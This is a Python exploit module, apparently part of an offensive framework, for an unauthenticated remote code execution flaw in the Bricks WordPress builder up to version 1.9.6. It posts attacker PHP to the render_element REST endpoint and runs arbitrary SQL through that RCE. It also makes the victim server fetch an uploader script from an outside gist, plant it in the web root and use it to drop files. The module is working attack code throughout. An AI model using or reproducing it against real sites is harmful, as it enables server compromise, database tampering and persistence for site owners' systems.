from helpers import *
import re, requests

##
# Module:       bricks
# Exploit:      1.9.6-rce
# Description:  unauthenticated RCE against bricks version up to 1.9.6

##
# Vulnerabilities   (required)
def get_vuln():
    return ['RCE', 'FILEi', 'SQLi']

##
# Is auth required (ie stolen cookies)
def req_auth():
    return False

##
# Attack            (required)
# Performs the actual attack
# Requires a payload & target

def attack(args, payload):
    # module:   bricks
    # exploit:  1.9.6-rce
    # target:   https://domain.com
    # payload:  rce-test 

    # Available dependencies
    deps = payload.get_dep()
    for dep in deps:
        if dep in get_vuln():
            pinfo("Detonating with:", dep)
            detonate(payload, dep, args)
            exit()

##
# Detonate the payload      (optional)
def detonate(payload, vuln, args):
    if vuln == 'RCE':
        phps = payload.detonate(vuln, args)
        for php in phps:
            execute_php(php, args)

    if vuln == 'FILEi':
        files = payload.detonate(vuln, args)
        for file in files:
            upload_file(file, args)

    elif vuln == 'SQLi':
        sqls = payload.detonate(vuln, args)
        iid = False
        for sql in sqls:
            if iid:
                sql = re.sub('#iid#', iid, sql)
                iid = False
            res = execute_sql(sql, args)
            if res['iid']:
                iid = res['iid']

def execute_php(php, args):
    if args.verbose:
        pinfo("Executing PHP:",php)

    # Get nonce
    try:
        html = requests.get(args.target)
    except(requests.exceptions.ConnectionError, requests.exceptions.Timeout):
        perror("Target seems offline")
        exit()

    nonce_match = re.search('nonce":"(.*?)",', str(html.text))
    if nonce_match is None:
        perror("Cannot find nonce")
        exit()
    nonce = nonce_match.group(1)

    #Evil Object
    evil_obj = {
        'nonce': nonce,
        'postId': '1234',
        'action': 'bricks_render_element',
        'element': {
            'id': 'ahavrd',
            'name': 'code',
            'settings': {
                'code': php,
                'executeCode': True
            }
        }
    }

    #Send
    url = args.target + "/wp-json/bricks/v1/render_element"
    res = requests.post(url, json=evil_obj)
    if res.status_code == 200:
        if args.verbose:
            psuccess(res.text)
        else:
            out = re.search('code\\\\">(.*?)<', res.text)
            if out and out[1]: #Do not out if empty
                psuccess("PHP: " + out[1])
            else:
                psuccess(res.text)
        return res.text
    else:
        perror(res.text)
        perror("=== There was an error ===")
        return False

def execute_sql(sql, args):
    if args.verbose:
        pinfo("Executing SQL:", sql)
    # Since we have RCE, we can use that for SQLi
    args.verbose = False
    #sql = sql.replace('\\"', '\\\\"')
    res = execute_php("<?php global $wpdb; $res = $wpdb->query(\""+sql+"\"); if ($res === false) {echo $wpdb->last_error;} else { echo 'AFFECTED ROWS: ' . $res; if ($wpdb->insert_id) { echo ' INSERT ID: ' . $wpdb->insert_id; } } ?>", args)
    if res:
        # Excpected return
        # ret = {
        #   'success':True,
        #   'rows': 123,
        #   'id': 321
        #}
        ret = {
            'success':True,
            'rows':re.search('AFFECTED ROWS: (.*?) I', res)[1],
            'iid':re.search('INSERT ID: (.*?)<', res)[1],
        }
        psuccess("",ret)
        return ret

    else:
        perror("There was an error executing SQL")
        return False

def upload_file(file, args):
    ## Download uploader.php from git
    uploader_php_url = "https://gist.githubusercontent.com/etragardh/4179e4a6b1fbea5d9c17de66dca17c8e/raw/0b56b089911b43c7ec75f0bf95cab1228f65295a/uploader.php"

    execute_php("<?php $c=file_get_contents('"+uploader_php_url+"'); file_put_contents($_SERVER['DOCUMENT_ROOT'].'/uploader.php', $c); ?>", args)

    # Perform upload
    files = {'file': open(file, 'rb')}
    r = requests.post(args.target + '/uploader.php', files=files)

    if args.verbose:
        pinfo("Uploading file:", file)
    if r.status_code == 200:
        psuccess("Uploaded:", args.target + "/" + os.path.basename(file))
    else:
        perror("There was an error :/")

    # Unlink upload helper
    execute_php("<?php unlink($_SERVER['DOCUMENT_ROOT'].'/uploader.php'); ?>", args)


##
# Help
# Display help text

def help():
    print("This is the help")
